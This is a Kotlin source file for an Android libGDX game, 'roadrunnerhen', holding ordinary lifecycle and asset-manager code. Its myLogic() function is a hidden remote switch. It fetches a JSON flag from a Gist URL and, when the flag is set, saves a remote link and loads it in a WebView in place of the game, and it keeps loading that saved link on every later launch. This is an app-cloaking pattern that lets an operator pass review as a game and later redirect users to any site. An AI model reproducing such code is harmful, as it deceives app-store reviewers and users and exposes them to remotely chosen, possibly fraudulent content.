package com.roadrunnerhen.hen.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import androidx.core.content.edit
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.roadrunnerhen.hen.MainActivity
import com.roadrunnerhen.hen.appContext
import com.roadrunnerhen.hen.game.manager.MusicManager
import com.roadrunnerhen.hen.game.manager.NavigationManager
import com.roadrunnerhen.hen.game.manager.SoundManager
import com.roadrunnerhen.hen.game.manager.SpriteManager
import com.roadrunnerhen.hen.game.manager.util.MusicUtil
import com.roadrunnerhen.hen.game.manager.util.SoundUtil
import com.roadrunnerhen.hen.game.manager.util.SpriteUtil
import com.roadrunnerhen.hen.game.screens.LoaderScreen
import com.roadrunnerhen.hen.game.utils.GameColor
import com.roadrunnerhen.hen.game.utils.advanced.AdvancedGame
import com.roadrunnerhen.hen.game.utils.disposeAll
import com.roadrunnerhen.hen.game.utils.gdxGame
import com.roadrunnerhen.hen.util.Gist
import com.roadrunnerhen.hen.util.log
import kotlinx.coroutines.*

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Beta", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        myLogic()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        log("pause")
        super.pause()
        GDX_GLOBAL_isPauseGame = true
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        log("resume")
        super.resume()
        GDX_GLOBAL_isPauseGame = false
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun myLogic() {
        log("statMessageForJeack")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val savedData = sharedPreferences.getString("gustave", "load") ?: "load"

        try {
            if (savedData == "load") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson(activity.getGistURL()) }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag != "true") GDX_GLOBAL_isGame = true
                        else {
                            gdxGame.sharedPreferences.edit { putString("gustave", getJSON.link) }
                            activity.webViewHelper.loadUrl(getJSON.link)
                        }
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.webViewHelper.loadUrl(savedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

}